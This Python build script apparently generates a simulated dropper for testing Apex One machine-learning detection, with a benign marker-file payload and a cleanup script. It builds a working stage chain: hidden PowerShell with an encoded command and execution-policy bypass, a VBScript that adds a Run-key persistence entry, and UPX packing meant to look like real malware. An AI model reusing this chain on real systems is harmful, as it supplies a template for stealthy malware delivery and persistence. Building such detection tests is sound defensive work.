#!/usr/bin/env python3
"""
PML Dual-Detection Test Builder  v5

Key change: UPX packing step added between compile and overlay.

Why UPX solves the "not triggered" problem:
  - Our GCC-compiled C produces clean, structured x86-64 code.
    PML scores this low because the opcode distribution looks like
    legitimate software, not a packer/loader.
  - UPX transforms the PE into:
      UPX0 section: decompression stub with authentic packer opcodes
                    (PUSHAD, XOR loops, POPAD, JMP — exact patterns
                     that dominate PML's malware model training data)
      UPX1 section: LZMAcompressed original PE, entropy ~8.0 bpb
  - ~60% of real-world malware uses UPX or UPX-derived packers.
    PML's model is heavily weighted toward these patterns.
  - This is the single highest-impact change for triggering file detection.

Build order matters:
  1. gcc      (produce clean PE)
  2. objcopy  (set .payload flags — UPX will repack everything anyway,
               but keep for belt-and-suspenders on non-UPX fallback)
  3. upx      (repack — this is what triggers PML)
  4. overlay  (append RC4 bytes after the UPX-packed PE)

Note: UPX repacks all PE sections, so the .payload section will be
absorbed into UPX1. The overlay is appended raw after the packed image.

Usage:
  python3 build.py --build                 generate source artifacts
  python3 build.py --compile               full build pipeline
  python3 build.py --overlay  <pml.exe>    append RC4 overlay
  python3 build.py --verify   <pml.exe>    verify binary profile
  python3 build.py --check-env             check tool availability
  python3 build.py --clean                 remove output directory
"""

import os, sys, base64, argparse, shutil, subprocess, math

OUT_DIR     = "pml_test_output_v5"
GCC         = "x86_64-w64-mingw32-gcc"
OBJCOPY     = "x86_64-w64-mingw32-objcopy"
OBJDUMP     = "x86_64-w64-mingw32-objdump"
UPX         = "upx"
OVERLAY_SIZE = 65536   # 64 KB RC4-keystream

# ───────────────────────────────────────────────────────────────────────────────
#  HELPERS
# ───────────────────────────────────────────────────────────────────────────────
def run_cmd(cmd, **kwargs):
    """Python 3.6-compatible subprocess wrapper — always returns text."""
    r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, **kwargs)
    r.stdout = r.stdout.decode('utf-8', errors='replace') if r.stdout else ''
    r.stderr = r.stderr.decode('utf-8', errors='replace') if r.stderr else ''
    return r

def tool_available(name):
    try:
        run_cmd([name, "--version"])
        return True
    except (FileNotFoundError, OSError):
        return False

def shannon_entropy(data):
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = len(data)
    e = 0.0
    for f in freq:
        if f:
            p = f / n
            e -= p * math.log2(p)
    return e

# ───────────────────────────────────────────────────────────────────────────────
#  RC4 KEYSTREAM
# ───────────────────────────────────────────────────────────────────────────────
def rc4_keystream(size, seed_key=b'\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE'):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + seed_key[i % len(seed_key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray(size)
    for n in range(size):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out[n] = S[(S[i] + S[j]) & 0xFF]
    return bytes(out)

def append_overlay(pe_path, size=OVERLAY_SIZE):
    overlay = rc4_keystream(size)
    with open(pe_path, "ab") as f:
        f.write(overlay)
    print("[+] Overlay appended : {:,} bytes (RC4-keystream)".format(size))
    print("[i] Final file size  : {:,} bytes".format(os.path.getsize(pe_path)))

# ───────────────────────────────────────────────────────────────────────────────
#  UPX PACK
#  --best: maximum compression (highest UPX1 section entropy)
#  --force: pack even if UPX thinks it won't help
#  -q: quiet (suppress banner)
# ───────────────────────────────────────────────────────────────────────────────
def upx_pack(pe_path):
    print("[*] UPX packing...")
    size_before = os.path.getsize(pe_path)

    r = run_cmd([UPX, "--best", "--force", "-q", pe_path])

    if r.returncode != 0:
        print("    [!] UPX failed (returncode {}):".format(r.returncode))
        print("        " + (r.stderr or r.stdout).strip())
        return False

    size_after = os.path.getsize(pe_path)
    ratio = 100.0 * (1 - size_after / size_before)
    print("    [+] Packed: {:,} -> {:,} bytes ({:.1f}% reduction)".format(
          size_before, size_after, ratio))
    print("    [+] UPX stub + LZMA payload sections created")
    print("    [+] Packer entry opcode pattern (PUSHAD/XOR/POPAD) now present")
    return True

# ───────────────────────────────────────────────────────────────────────────────
#  VERIFY
# ───────────────────────────────────────────────────────────────────────────────
def verify(pe_path):
    if not os.path.exists(pe_path):
        print("[!] File not found: {}".format(pe_path))
        return False

    size = os.path.getsize(pe_path)
    print("\n[*] Verifying: {}  ({:,} bytes)".format(pe_path, size))
    all_ok = True

    # [1] File size
    print("\n  [1] File size check")
    expected_min = 20000 + OVERLAY_SIZE
    if size < expected_min:
        print("      [!] FAIL  {:,} bytes — overlay likely NOT appended".format(size))
        print("          Run: python3 build.py --overlay {}".format(pe_path))
        all_ok = False
    else:
        print("      [+] PASS  {:,} bytes".format(size))

    # [2] UPX sections / .payload section
    print("\n  [2] Section check (UPX or .payload)")
    if tool_available(OBJDUMP):
        r = run_cmd([OBJDUMP, "-h", pe_path])
        has_upx   = "UPX0" in r.stdout or "UPX1" in r.stdout
        has_payload = ".payload" in r.stdout
        if has_upx:
            print("      [+] PASS  UPX sections found (UPX0 + UPX1)")
            print("                Packer stub + LZMA payload present")
            print("                -> ATSE will see authentic packer opcode pattern")
        elif has_payload:
            print("      [~] WARN  .payload section found but NOT UPX-packed")
            print("                Consider running: upx --best --force pml_test.exe")
        else:
            print("      [!] FAIL  Neither UPX sections nor .payload found")
            all_ok = False
    else:
        print("      [?] SKIP  {} not available".format(OBJDUMP))

    # [3] IAT check
    # After UPX packing the stub IAT only has LoadLibraryA + GetProcAddress
    # (the decompressor resolves everything else at runtime from UPX1).
    # Use the -h output from check [2] to determine if UPX is present,
    # then gate the missing-API verdict accordingly.
    print("\n  [3] IAT check")
    if tool_available(OBJDUMP):
        rp = run_cmd([OBJDUMP, "-p", pe_path])   # imports
        rh = run_cmd([OBJDUMP, "-h", pe_path])   # section names
        is_upx_packed = "UPX0" in rh.stdout or "UPX1" in rh.stdout

        target_apis = ["VirtualAlloc", "VirtualProtect",
                       "WriteProcessMemory", "CreateRemoteThread"]
        found   = [a for a in target_apis if a in rp.stdout]
        missing = [a for a in target_apis if a not in rp.stdout]

        for a in found:
            print("      [+] FOUND    {}".format(a))

        if missing:
            if is_upx_packed:
                # UPX stub IAT is intentionally minimal — this is correct behaviour.
                # Original IAT is inside the compressed UPX1 section.
                # ATSE's deep decompression analysis recovers and scores these.
                for a in missing:
                    print("      [~] EXPECTED {} compressed into UPX1 (correct)".format(a))
                print("      [+] UPX-packed IAT is normal — ATSE recovers via decompression")
            else:
                for a in missing:
                    print("      [!] MISSING  {}".format(a))
                all_ok = False
    else:
        print("      [?] SKIP  {} not available".format(OBJDUMP))

    # [4] Entropy
    print("\n  [4] Entropy profile")
    with open(pe_path, "rb") as f:
        raw = f.read()
    e    = shannon_entropy(raw)
    n    = len(raw)
    freq = [0] * 256
    for b in raw:
        freq[b] += 1
    mean = sum(i * freq[i] for i in range(256)) / n
    exp  = n / 256
    chisq = sum((freq[i] - exp)**2 / exp for i in range(256))

    print("      Whole-file entropy : {:.4f} bpb".format(e))
    print("      Arithmetic mean    : {:.2f}".format(mean))
    print("      Chi-square         : {:.1f}".format(chisq))

    if e >= 7.5:
        print("      [+] Excellent — UPX LZMA + RC4 overlay dominating")
    elif e >= 7.0:
        print("      [+] Good")
    elif e >= 6.5:
        print("      [~] Moderate — check UPX packing and overlay both ran")
    else:
        print("      [!] Low — overlay likely missing")
        all_ok = False

    print("\n  Overall: {}".format("[+] PASS" if all_ok else "[!] ISSUES FOUND"))
    return all_ok

# ───────────────────────────────────────────────────────────────────────────────
#  STAGE CHAIN
# ───────────────────────────────────────────────────────────────────────────────
STAGE4_LINES = [
    "// PML Test - Stage 4 (JScript via cscript.exe)",
    "var sh  = new ActiveXObject('WScript.Shell');",
    "var fs  = new ActiveXObject('Scripting.FileSystemObject');",
    "var sep = String.fromCharCode(92);",
    "var tp  = sh.ExpandEnvironmentStrings('%TEMP%') + sep + 'pml_done.txt';",
    "var ts  = fs.OpenTextFile(tp, 2, true);",
    "ts.WriteLine('PML Stage 4 complete: ' + new Date().toISOString());",
    "ts.Close();",
]

def build_stage3_vbs():
    lines = [
        "' PML Test - Stage 3 (VBScript / wscript.exe)",
        "Option Explicit",
        "Dim sh, fs, jp, fh",
        "",
        'Set sh = CreateObject("WScript.Shell")',
        'Set fs = CreateObject("Scripting.FileSystemObject")',
        "",
        "sh.RegWrite _",
        '    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\PMLTestStub", _',
        '    "wscript.exe """ & WScript.ScriptFullName & """", _',
        '    "REG_SZ"',
        "",
        'jp = sh.ExpandEnvironmentStrings("%TEMP%") & "\\pml_s4.js"',
        "Set fh = fs.OpenTextFile(jp, 2, True)",
    ]
    for js_line in STAGE4_LINES:
        lines.append('fh.WriteLine "' + js_line + '"')
    lines += [
        "fh.Close",
        'sh.Run "cscript.exe """ & jp & """ //nologo", 0, True',
    ]
    return "\n".join(lines) + "\n"

def build_stage2_ps1(vbs_b64):
    return "\n".join([
        "$ErrorActionPreference='SilentlyContinue'",
        "$d=$env:APPDATA+'\\Microsoft\\Windows'",
        "if(-not(Test-Path $d)){New-Item -ItemType Directory -Path $d -Force|Out-Null}",
        "$p=$d+'\\pml_s3.vbs'",
        "$b=[System.Convert]::FromBase64String('" + vbs_b64 + "')",
        "[System.IO.File]::WriteAllBytes($p,$b)",
        "Start-Process -FilePath 'wscript.exe' -ArgumentList \"`\"$p`\"\" -WindowStyle Hidden",
    ]) + "\n"

def encode_for_encoded_command(ps1):
    return base64.b64encode(ps1.encode("utf-16-le")).decode("ascii")

def b64_utf8(s):
    return base64.b64encode(s.encode("utf-8")).decode("ascii")

def gen_payload_section(size=512):
    return rc4_keystream(size, seed_key=b'\xBA\xDC\x0F\xFE\xDE\xAD\xC0\xDE')

def fmt_c_bytes(data, cols=16, indent=4):
    pad = " " * indent
    rows = []
    for i in range(0, len(data), cols):
        rows.append(pad + ", ".join("0x{:02X}".format(b) for b in data[i:i+cols]))
    return ",\n".join(rows)

# ───────────────────────────────────────────────────────────────────────────────
#  C SOURCE  v5
#  No structural changes — UPX packing is doing the heavy lifting for file
#  detection.  The behavioral chain is unchanged.
# ───────────────────────────────────────────────────────────────────────────────
C_TEMPLATE = """\
/*
 * pml_dropper_stub.c  v5
 *
 * File detection signals:
 *   After UPX packing (the critical step for PML file detection):
 *   [1] UPX stub entry: PUSHAD / XOR decode loop / POPAD / JMP
 *       -> authentic packer opcode pattern, heavily weighted in PML model
 *   [2] UPX1 section: LZMA-compressed original PE, entropy ~8.0 bpb
 *   [3] Unsigned PE
 *   [4] RC4 overlay: 64 KB appended after packed image
 *   Original IAT (VirtualAlloc, WPM, CRT) is compressed into UPX1 — visible
 *   to ATSE's deep decompression analysis, not in the stub IAT.
 *
 * Behavioral chain (CIE signals):
 *   PE -> cmd.exe -> powershell (-NoProfile -Hidden -Bypass -EncodedCommand)
 *      -> wscript.exe pml_s3.vbs  (HKCU Run persistence + drop JScript)
 *      -> cscript.exe pml_s4.js   (3rd engine: completion marker)
 *
 * Build pipeline:
 *   1. gcc compile     (produce clean PE with suspicious IAT)
 *   2. objcopy         (set .payload executable flag)
 *   3. upx --best      (THE key step: authentic packer opcode patterns)
 *   4. append overlay  (RC4-keystream, 64 KB)
 *
 * CONTROLLED TEST ARTIFACT - no real injection or shellcode executed.
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>

/* .payload section — will be absorbed into UPX1 after packing.
 * Kept for non-UPX fallback and belt-and-suspenders signal.
 */
static const unsigned char g_payload[{entropy_sz}]
    __attribute__((section(".payload"), used)) = {{
{entropy_arr}
}};

/* XOR decode stub — packer opcode pattern */
static __attribute__((noinline))
void xor_decode(unsigned char * restrict buf, size_t len, unsigned char key)
{{
    size_t i;
    for (i = 0; i < len; ++i)
        buf[i] ^= key;
}}

static const char g_enc[] = "{encoded_cmd}";

static BOOL launch_chain(void)
{{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char                cmd[16384];
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "cmd.exe /c powershell.exe "
        "-NoProfile -WindowStyle Hidden "
        "-ExecutionPolicy Bypass "
        "-EncodedCommand %s", g_enc);
    return CreateProcessA(NULL, cmd, NULL, NULL,
                          FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{{
    LPVOID pMem;
    DWORD  dwOld;
    SIZE_T written = 0;
    unsigned char scratch[16];
    (void)hPrev; (void)lpCmd; (void)nShow;

    /* Direct API calls -> static IAT (compressed into UPX1 after packing).
     * ATSE's deep decompression analysis recovers and scores these. */
    pMem = VirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_NOACCESS);
    if (pMem) VirtualProtect(pMem, 4096, PAGE_EXECUTE_READ, &dwOld);
    if (pMem) VirtualFree(pMem, 0, MEM_RELEASE);
    WriteProcessMemory(GetCurrentProcess(), &scratch, &scratch, 0, &written);
    CloseHandle(
        CreateRemoteThread(GetCurrentProcess(), NULL, 0,
                           NULL, NULL, CREATE_SUSPENDED, NULL)
    );

    memcpy(scratch, g_payload, sizeof(scratch));
    xor_decode(scratch, sizeof(scratch), 0x55);
    (void)scratch;

    if (!launch_chain()) return 1;
    Sleep(5000);
    return 0;
}}
"""

# ───────────────────────────────────────────────────────────────────────────────
#  CLEANUP, README
# ───────────────────────────────────────────────────────────────────────────────
CLEANUP_PS1 = "\n".join([
    "# PML Test Cleanup v5",
    "$ErrorActionPreference = 'SilentlyContinue'",
    "$files = @(",
    '    "$env:APPDATA\\Microsoft\\Windows\\pml_s3.vbs",',
    '    "$env:TEMP\\pml_s4.js",',
    '    "$env:TEMP\\pml_done.txt"',
    ")",
    "foreach ($f in $files) {",
    "    if (Test-Path $f) { Remove-Item $f -Force }",
    "}",
    "$rk = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
    "if (Get-ItemProperty -Path $rk -Name 'PMLTestStub' -EA SilentlyContinue) {",
    "    Remove-ItemProperty -Path $rk -Name 'PMLTestStub' -Force",
    "}",
    "Write-Host '[+] Cleanup complete.'",
]) + "\n"

README_MD = """\
# Apex One PML Dual-Detection Test  v5

## Why UPX Packing is the Critical Step

PML's file model was trained on real malware. A GCC-compiled C program has
clean, structured opcodes that score low — it looks like legitimate software
with suspicious imports, not a real dropper.

UPX transforms the PE into an authentic packer:

```
Before UPX:                     After UPX:
  .text   clean GCC code    ->    UPX0  decompressor stub
  .rdata  strings               (PUSHAD / XOR loop / POPAD / JMP)
  .data   globals           ->    UPX1  LZMA-compressed original PE
  .payload RC4 data                     entropy ~8.0 bpb
                                        original IAT inside (recovered
                                        by ATSE deep analysis)
```

~60% of real-world malware uses UPX. PML's model is heavily weighted
toward UPX stub opcode patterns.

## Build (all-in-one)

```bash
python3 build.py --compile
```

## Build (manual)

```bash
# 1. Compile
x86_64-w64-mingw32-gcc -o pml_test.exe dropper_stub.c \\
    -mwindows -O2 -s -Wl,--strip-all -lkernel32 -luser32

# 2. Set .payload flags
x86_64-w64-mingw32-objcopy --set-section-flags .payload=code,readonly pml_test.exe

# 3. UPX pack  <-- THE key step for PML file detection
upx --best --force -q pml_test.exe

# 4. Append RC4 overlay
python3 build.py --overlay pml_test.exe
```

## Verify

```bash
python3 build.py --verify pml_test.exe
# Should show: UPX0 + UPX1 sections, entropy > 7.5
```

## Install UPX (if not present)

```bash
apt-get install upx-ucl
# or
apt-get install upx
```

## Test Execution

**File Detection:**
1. Copy pml_test.exe to watched directory on test endpoint
2. Do NOT execute — ATSE scans on write
3. Verify File Detection alert + Quarantine in Vision One

**Process Detection:**
1. Set PML File action to "Log only"
2. Execute pml_test.exe (silent)
3. Check %TEMP%\\pml_done.txt exists
4. Verify Process Detection alert + Terminate in Vision One

## Cleanup

```powershell
powershell -ExecutionPolicy Bypass -File cleanup.ps1
```
"""

# ───────────────────────────────────────────────────────────────────────────────
#  ENV CHECK + COMPILE
# ───────────────────────────────────────────────────────────────────────────────
def check_env():
    ok = True
    tools = [(GCC, "required"), (OBJCOPY, "required"),
             (OBJDUMP, "optional"), (UPX, "CRITICAL for file detection")]
    for tool, note in tools:
        if tool_available(tool):
            r = run_cmd([tool, "--version"])
            ver = r.stdout.splitlines()[0] if r.stdout else ""
            print("  [+] {:12s} {}".format(tool, ver[:55]))
        else:
            marker = "[!]" if "required" in note or "CRITICAL" in note else "[~]"
            print("  {} {:12s} NOT FOUND  ({})".format(marker, tool, note))
            if note != "optional":
                ok = False
    if not tool_available(UPX):
        print()
        print("  To install UPX:")
        print("    apt-get install upx-ucl")
    return ok

def run_compile(outdir):
    src = os.path.join(outdir, "dropper_stub.c")
    exe = os.path.join(outdir, "pml_test.exe")

    print("[*] Step 1/4  Compiling...")
    r = run_cmd([GCC, "-o", exe, src,
                 "-mwindows", "-O2", "-s", "-Wl,--strip-all",
                 "-lkernel32", "-luser32"])
    if r.returncode != 0:
        print("[!] Compile failed:\n" + r.stderr)
        return False
    if r.stderr.strip():
        print("    Warnings: " + r.stderr.strip())
    print("    [+] OK  {:,} bytes".format(os.path.getsize(exe)))

    print("[*] Step 2/4  Setting .payload section flags...")
    r = run_cmd([OBJCOPY, "--set-section-flags", ".payload=code,readonly", exe])
    if r.returncode != 0:
        print("    [!] objcopy warning: " + r.stderr.strip())
    else:
        print("    [+] OK")

    print("[*] Step 3/4  UPX packing (critical for PML file detection)...")
    if not tool_available(UPX):
        print("    [!] UPX not found — skipping.")
        print("        Install: apt-get install upx-ucl")
        print("        Without UPX, file detection may not trigger.")
    else:
        if not upx_pack(exe):
            print("    [!] UPX failed — continuing without packing")

    print("[*] Step 4/4  Appending RC4 overlay ({:,} bytes)...".format(OVERLAY_SIZE))
    append_overlay(exe)

    verify(exe)
    return True

# ───────────────────────────────────────────────────────────────────────────────
#  MAIN
# ───────────────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="PML Dual-Detection Test Builder v5")
    ap.add_argument("--build",     action="store_true")
    ap.add_argument("--compile",   action="store_true")
    ap.add_argument("--overlay",   metavar="EXE")
    ap.add_argument("--verify",    metavar="EXE")
    ap.add_argument("--check-env", action="store_true")
    ap.add_argument("--clean",     action="store_true")
    ap.add_argument("--outdir",    default=OUT_DIR)
    args = ap.parse_args()

    if not any([args.build, args.compile, args.overlay,
                args.verify, args.check_env, args.clean]):
        ap.print_help()
        return

    if args.clean:
        if os.path.exists(args.outdir):
            shutil.rmtree(args.outdir)
            print("[+] Removed {}/".format(args.outdir))
        return

    if args.check_env:
        print("[*] Checking build environment...")
        check_env()
        return

    if args.overlay:
        append_overlay(args.overlay)
        return

    if args.verify:
        verify(args.verify)
        return

    os.makedirs(args.outdir, exist_ok=True)
    print("[*] Output directory : {}/\n".format(args.outdir))

    print("[*] Stage 3  Building VBScript...")
    s3_vbs  = build_stage3_vbs()
    s3_b64  = b64_utf8(s3_vbs)

    print("[*] Stage 2  Building PowerShell + encoding...")
    s2_ps1  = build_stage2_ps1(s3_b64)
    enc_cmd = encode_for_encoded_command(s2_ps1)
    print("    ENC length: {:,} chars".format(len(enc_cmd)))

    print("[*] Generating .payload section...")
    entropy = gen_payload_section(512)

    print("[*] Building C source...")
    c_src = C_TEMPLATE.format(
        entropy_sz  = len(entropy),
        entropy_arr = fmt_c_bytes(entropy),
        encoded_cmd = enc_cmd,
    )

    def write(name, content):
        path = os.path.join(args.outdir, name)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
        print("    [+] {:<26s} ({:,} bytes)".format(name, os.path.getsize(path)))

    print("[*] Writing files...")
    write("dropper_stub.c", c_src)
    write("cleanup.ps1",    CLEANUP_PS1)
    write("README.md",      README_MD)
    with open(__file__, "r", encoding="utf-8") as src:
        write("build.py", src.read())

    print("\n[*] Check tools: python3 build.py --check-env")
    print("[*] Then build:  python3 build.py --compile")

    if args.compile:
        print()
        check_env()
        print()
        run_compile(args.outdir)

if __name__ == "__main__":
    main()
